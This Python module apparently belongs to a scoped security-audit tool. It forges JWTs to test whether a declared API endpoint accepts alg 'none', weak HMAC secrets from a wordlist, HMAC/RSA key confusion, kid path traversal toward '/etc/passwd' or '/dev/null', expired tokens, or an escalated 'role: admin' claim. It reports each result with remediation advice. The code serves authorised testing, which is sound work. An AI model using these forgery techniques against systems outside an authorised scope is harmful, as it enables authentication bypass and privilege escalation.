"""Self-contained token (JWT) audit: which forged tokens the verifier accepts.

Every attack is a real request through the scoped probe to the operator-declared
token-accepting URL, judged against an anonymous control. A finding needs a 200
carrying content the control did not get; "the status is not 401" proves nothing.
Tokens are decoded with base64url only, never verified here.
"""
import base64
import hashlib
import hmac
import json
import re
import time
from pathlib import Path

from .checks import _candidate

AUTH_OWASP = "API2:2023 Broken Authentication"
FUNC_OWASP = "API5:2023 Broken Function Level Authorization"

# deliberately short: the point is the shared default, not a cracker
WEAK_SECRETS = (
    "secret", "changeme", "jwtsecret", "password", "jwt", "key", "test",
    "supersecret", "secretkey", "mysecret", "jwt-secret", "s3cr3t", "password123",
    "admin", "123456", "token", "app", "api", "dev", "development", "prod",
    "production", "private", "signing", "hmac", "tokenkey", "jwt_key", "jwtkey",
    "default", "symmetric", "aes", "rsa", "demo", "sample", "example", "password1",
    "qwerty", "letmein", "topsecret", "libella",
)
ALG_NONE = ("none", "nOnE", "None")
# a kid that resolves to an empty file: the traversal is proven only if the
# signature made with the empty string is accepted
KID_TRAVERSAL = ("../../../../dev/null", "/dev/null", "../../../../etc/passwd")
JWT_RE = re.compile(r"eyJ[A-Za-z0-9_-]{4,}\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*")


def _b64e(raw: bytes) -> str:
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()


def _b64d(seg: str) -> bytes:
    return base64.urlsafe_b64decode(seg + "=" * (-len(seg) % 4))


def _decode(token: str) -> dict | None:
    """Header, claims and raw signing input of a token; None if it is not one."""
    parts = str(token).split(".")
    if len(parts) != 3:
        return None
    try:
        header, claims = json.loads(_b64d(parts[0])), json.loads(_b64d(parts[1]))
    except (ValueError, TypeError):
        return None
    if not isinstance(header, dict) or "alg" not in header or not isinstance(claims, dict):
        return None
    return {"header": header, "claims": claims, "input": f"{parts[0]}.{parts[1]}",
            "sig": parts[2]}


def _sig(secret: bytes, signing_input: str) -> str:
    return _b64e(hmac.new(secret, signing_input.encode(), hashlib.sha256).digest())


def _forge(src: dict, alg: str, secret: bytes | None, patch: dict | None = None,
           header_extra: dict | None = None) -> str:
    header = {"alg": alg, "typ": "JWT"}
    if src["header"].get("kid") is not None:
        header["kid"] = src["header"]["kid"]
    header.update(header_extra or {})
    claims = {**src["claims"], **(patch or {})}
    signing_input = f"{_b64e(json.dumps(header, separators=(',', ':')).encode())}." \
                    f"{_b64e(json.dumps(claims, separators=(',', ':')).encode())}"
    return f"{signing_input}.{'' if secret is None else _sig(secret, signing_input)}"


def _hdrs(header_name: str, token: str) -> dict:
    if header_name.lower() == "cookie":
        return {"Cookie": token}
    if header_name.lower() == "authorization":
        return {header_name: f"Bearer {token}"}
    return {header_name: token}


def _quote(body: str) -> str:
    return (body or "").strip()[:120]


def _harvest(result: dict) -> list[tuple[str, str]]:
    """Tokens in Set-Cookie/Authorization headers, the URL query, or the body JSON."""
    found = []
    for name, value in (result.get("headers") or {}).items():
        label = "Set-Cookie" if name.lower() == "set-cookie" else f"header {name}"
        found += [(label, t) for t in JWT_RE.findall(str(value))]
    found += [("url query", t) for t in JWT_RE.findall(result.get("url") or "")]
    found += [("response body", t) for t in JWT_RE.findall(result.get("body") or "")]
    return found


def _describe(token: dict, source: str) -> str:
    h, c = token["header"], token["claims"]
    bits = [f"alg={h.get('alg')}"]
    for name in ("kid", "jku", "x5u"):
        if h.get(name):
            bits.append(f"{name}={h[name]}")
    for claim in ("iss", "aud", "sub", "user_id", "role", "scope", "iat", "exp"):
        if claim in c:
            bits.append(f"{claim}={c[claim]}")
    exp = c.get("exp")
    if exp is None:
        bits.append("exp: absent")
    elif isinstance(exp, (int, float)) and exp < time.time():
        bits.append("exp: already past")
    return f"token from {source}: " + ", ".join(bits)


def audit_jwt(db, evidence, probe, scope, engagement_id: str, auth_json: dict,
              pipeline, intent_id: str | None = None) -> dict:
    """Forge tokens against the declared verification URL; report only what is accepted."""
    auth = auth_json or {}
    hints = (auth.get("test_hints") or {}).get("jwt") or {}
    header_name = hints.get("header_name") or "Authorization"
    out = {"candidates": 0, "findings": [], "observations": [], "limitations": []}

    def limit(summary: str):
        out["limitations"].append(summary)
        pipeline.record_observation(engagement_id, intent_id, "jwt_limitation", summary)

    def observe(summary: str, evidence_id: str | None = None):
        out["observations"].append(summary)
        pipeline.record_observation(engagement_id, intent_id, "jwt_token", summary,
                                    evidence_id=evidence_id)

    def req(url: str, token: str | None, tool: str = "jwt_check") -> dict:
        return probe.request(engagement_id, scope, url, headers=_hdrs(header_name, token) if token else None,
                             category="api", intent_id=intent_id, tool=tool,
                             follow_redirects=False)

    # ---- discovery: the login response plus anything the operator supplies
    tokens: list[tuple[str, str]] = []
    if hints.get("token"):
        tokens.append(("operator hint", hints["token"]))
    ident = (auth.get("identities") or [None])[0]
    if ident and ident.get("login_url"):
        login = probe.request(
            engagement_id, scope, ident["login_url"], method="POST",
            headers={"Content-Type": "application/json"},
            body=json.dumps({"username": ident.get("username"), "password": ident.get("password")}),
            category="api", intent_id=intent_id, tool="jwt_login", follow_redirects=False)
        if not login.get("ok"):
            limit(f"login {ident['login_url']} not performed: {login.get('error')}")
        else:
            tokens += [(source, found_token) for source, found_token in _harvest(login)
                       if _decode(found_token)]
    seen: set[str] = set()
    decoded_tokens: list[tuple[str, str, dict]] = []
    for source, tok in tokens:
        decoded = _decode(tok)
        if decoded is None or tok in seen:
            continue
        seen.add(tok)
        decoded_tokens.append((source, tok, decoded))
        observe(_describe(decoded, source), None)
    if not decoded_tokens:
        limit("no self-contained token found in the login response or test_hints.jwt")
        return out

    url = hints.get("url")
    if not url:
        limit("no token-accepting verification URL declared (test_hints.jwt.url); "
              "no JWT attack was sent")
        return out
    decision = scope.check_url(url, "api")
    if not decision.allowed:
        limit(f"verification URL {url} is out of scope ({decision.reason}); no attack was sent")
        return out

    _, tok, src = decoded_tokens[0]
    anon, valid = req(url, None, tool="jwt_control"), req(url, tok, tool="jwt_control")
    if not anon.get("ok") or not valid.get("ok"):
        limit(f"verification URL {url} did not answer ({anon.get('error') or valid.get('error')}); "
              "nothing was proven")
        return out
    if anon["status"] == 200:
        limit(f"{url} answers 200 without a token; an accepted token is not distinguishable")
        return out
    if valid["status"] != 200:
        limit(f"the discovered token is not accepted at {url} (status {valid['status']}); "
              "attack results below are still judged against the anonymous control")

    def accepted(r: dict) -> bool:
        return (bool(r.get("ok")) and not r.get("mitigated") and r["status"] == 200
                and bool((r["body"] or "").strip()) and r["body"] != anon["body"])

    def submit(title, cwe, owasp, severity, description, impact, remediation, r, dedup, token,
               proof=None):
        quote = _quote(r["body"])
        if not quote or quote not in r["body"]:
            return
        cand = _candidate(title, cwe, owasp, severity, "high", url, description, impact,
                          remediation, r["evidence_id"], quote,
                          {"method": "GET", "url": url, "headers": _hdrs(header_name, token)},
                          dedup, proof=proof)
        res = pipeline.submit_candidate(engagement_id, cand, intent_id)
        out["findings"].append({"finding_id": res["id"], "title": title, "cwe": cwe,
                                "endpoint": url, "deduped": res["deduped"]})

    # ---- alg:none: signature field empty, algorithm chosen by the caller
    accepted_none = []
    for alg in ALG_NONE:
        forged = _forge(src, alg, None)
        r = req(url, forged)
        if accepted(r):
            accepted_none.append((alg, r, forged))
    if accepted_none:
        alg, r, forged = accepted_none[0]
        submit(f"JWT: alg '{alg}' accepted with an empty signature", "CWE-347", AUTH_OWASP,
               "critical",
               f"{url} returned protected content for a token whose header declares alg "
               f"'{alg}' and whose signature is empty; casings accepted: "
               + ", ".join(a for a, _, _ in accepted_none) + ".",
               "Anyone can mint a token with any claims: authentication is entirely bypassed.",
               "Pin the accepted algorithms server-side and reject 'none' before any parse.",
               r, f"jwt-alg-none:{url}", forged)

    # ---- weak HMAC secret: checked offline first, then proven with one request
    secret = next((s for s in WEAK_SECRETS
                   if _sig(s.encode(), src["input"]) == src["sig"]), None)
    if secret is None:
        observe(f"token signature matches none of the {len(WEAK_SECRETS)} built-in weak "
                "HMAC secrets")
    else:
        forged = _forge(src, "HS256", secret.encode())
        r = req(url, forged)
        if accepted(r):
            submit("JWT: HS256 secret is a guessable default", "CWE-347", AUTH_OWASP, "critical",
                   f"The token verifies against the built-in wordlist secret '{secret}', and "
                   f"{url} accepted a token re-signed with it, returning protected content.",
                   "An attacker forges arbitrary tokens for any user or role.",
                   "Use a long random per-deployment secret; rotate it and pin the algorithm.",
                   r, f"jwt-weak-secret:{url}", forged)
        else:
            observe(f"token verifies against weak secret '{secret}' but {url} did not accept "
                    "the re-signed token (status " + str(r.get("status")) + ")")

    # ---- HMAC/RSA confusion: the public key used as the HMAC secret
    confusion_secret: bytes | None = None

    def public_pem() -> bytes | None:
        if hints.get("pem"):
            try:
                return Path(hints["pem"]).read_bytes()
            except OSError as exc:
                limit(f"public key file {hints['pem']} unreadable: {exc}")
        urls = [hints[n] for n in ("jku", "jwks_uri", "x5u") if hints.get(n)] or \
               [src["header"][n] for n in ("jku", "x5u") if src["header"].get(n)]
        if not urls:
            return None
        for key_url in urls:
            r = req(key_url, None, tool="jwt_keys")
            if not r.get("ok"):
                limit(f"key source {key_url} refused or unreachable ({r.get('error')}); "
                      "no key was fetched")
                continue
            if "BEGIN" in r["body"] and ("KEY" in r["body"] or "CERTIFICATE" in r["body"]):
                return r["body"].encode()
            try:
                keys = json.loads(r["body"]).get("keys") or []
            except (ValueError, AttributeError):
                limit(f"key source {key_url} returned neither PEM nor JWKS")
                continue
            for key in keys:
                if not key.get("x5u"):
                    continue
                r2 = req(key["x5u"], None, tool="jwt_keys")
                if r2.get("ok") and "BEGIN" in r2["body"]:
                    return r2["body"].encode()
                limit(f"x5u {key['x5u']} refused or unreachable ({r2.get('error')}); "
                      "no key was fetched")
        limit("no reachable public key PEM for the HMAC confusion test")
        return None

    if str(src["header"].get("alg", "")).upper().startswith("RS"):
        pem = public_pem()
        if pem:
            forged = _forge(src, "HS256", pem)
            r = req(url, forged)
            if accepted(r):
                confusion_secret = pem
                submit("JWT: HMAC/RSA confusion - public key accepted as HMAC secret",
                       "CWE-347", AUTH_OWASP, "critical",
                       f"A token re-signed with HS256 keyed on the server's own public key PEM "
                       f"was accepted by {url}, which serves RS256.",
                       "Anyone holding the published verification key mints valid tokens.",
                       "Pin the algorithm to the key type; never let the token header choose it.",
                       r, f"jwt-hmac-confusion:{url}", forged)

    # ---- kid injection: the caller picks the key file
    for kid in KID_TRAVERSAL:
        forged = _forge(src, "HS256", b"", header_extra={"kid": kid})
        r = req(url, forged)
        if accepted(r):
            submit(f"JWT: kid path traversal accepted ('{kid}')", "CWE-345", AUTH_OWASP, "high",
                   f"With kid='{kid}' and an empty HMAC secret, {url} returned protected "
                   "content: the kid value is used as a key path without validation.",
                   "The attacker chooses the key material, including files they can predict.",
                   "Resolve kid against a fixed key map; never build a path from it.",
                   r, f"jwt-kid:{url}", forged)
            break
        if kid.endswith("etc/passwd"):
            observe(f"kid traversal to /etc/passwd not accepted at {url}; its file content is "
                    "unknown, so only /dev/null style empty files are provable")

    # ---- claims/expiry: needs a signing key this audit has already proven
    signing = secret.encode() if secret else confusion_secret
    if signing is None:
        limit("claim tampering and expiry tests not attempted: no signing key was proven "
              "(weak HMAC secret or key confusion)")
        if "exp" not in src["claims"]:
            observe("token carries no exp claim; expiry cannot be enforced")
        if "aud" in src["claims"]:
            observe(f"aud claim is '{src['claims']['aud']}'; acceptance by another service was "
                    "not tested (no second service declared)")
        return out

    now = int(time.time())
    expiry_ok = {}
    for name, patch in (("exp in the past", {"exp": now - 3600}), ("exp absent", {"exp": None})):
        forged = _forge(src, "HS256", signing, patch)
        r = req(url, forged)
        if accepted(r):
            expiry_ok[name] = (r, forged)
    if expiry_ok:
        name, (r, forged) = next(iter(expiry_ok.items()))
        submit(f"JWT: expired token accepted ({'; '.join(expiry_ok)})", "CWE-613", AUTH_OWASP,
               "high",
               f"{url} accepted, and returned protected content for, a token whose "
               f"expiry was not honoured: {'; '.join(expiry_ok)}.",
               "Stolen or leaked tokens stay valid forever; revocation is impossible.",
               "Reject tokens without exp and validate exp (with a small clock skew) on "
               "every request.",
               r, f"jwt-expiry:{url}", forged)
    else:
        observe("expiry controls held: tokens with a past or absent exp were rejected at " + url)

    valid_body = valid["body"] if valid["status"] == 200 else None
    uid = src["claims"].get("user_id", src["claims"].get("sub"))
    other = uid + 1 if isinstance(uid, int) else "2"
    patches = (("user_id", other), ("role", "admin"), ("is_admin", True), ("scope", "admin"))
    escalated = []
    for claim, value in patches:
        if claim not in src["claims"] and claim in ("user_id", "role", "scope"):
            continue
        forged = _forge(src, "HS256", signing, {claim: value})
        r = req(url, forged)
        if accepted(r) and r["body"] != valid_body:
            escalated.append((claim, value, r, forged))
    if escalated:
        claim, value, r, forged = escalated[0]
        submit(f"JWT: claim '{claim}' is trusted from the token", "CWE-863", FUNC_OWASP, "high",
               f"Re-signing the token with {claim}={json.dumps(value)} changed the protected "
               f"content returned by {url} (claims accepted: "
               + ", ".join(f"{c}={json.dumps(v)}" for c, v, _, _ in escalated) + ").",
               "A user with any account rewrites their own identity or role server-side.",
               "Derive identity and role from a server-side record keyed by sub; never trust "
               "authorization claims in the token.",
               r, f"jwt-claims:{url}", forged,
               # privilege model: the forged claim is the privilege; the control is the
               # same route with no token (submit() already requires it to be refused)
               proof={"identity": {"name": "token subject", "value": uid},
                      "privilege": f"{claim}={json.dumps(value)}",
                      "benign_request": {"method": "GET", "url": url}})
    else:
        observe("claim escalation not provable at " + url
                + ": re-signed role/scope/user_id claims changed nothing in the response")

    out["candidates"] = len(out["findings"])
    db.emit(engagement_id, "jwt_audit_complete",
            {"url": url, "alg": src["header"].get("alg"),
             "candidates": out["candidates"], "limitations": len(out["limitations"])})
    return out
